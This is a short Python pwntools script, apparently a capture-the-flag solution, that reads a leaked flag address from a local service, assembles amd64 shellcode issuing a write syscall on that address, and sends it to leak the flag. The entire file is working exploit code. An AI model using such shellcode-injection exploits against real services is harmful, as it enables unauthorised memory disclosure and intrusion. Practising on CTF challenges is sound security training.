from pwn import *

context.arch = "amd64"
p = remote('localhost', 8005)
#p = process("./only_ws")

txt = p.recvuntil(b"\n")
flag_addr = str(txt).split(" ")[-1].replace("\\r", "").replace("\\n", "")[:-1]
print(flag_addr)

payload = pwnlib.shellcraft.amd64.linux.syscall('SYS_write', 1,
                                                int(flag_addr, 16),
                                                32).rstrip()

print(payload)
payload = asm(payload)
p.sendline(payload)
print(p.recvall())
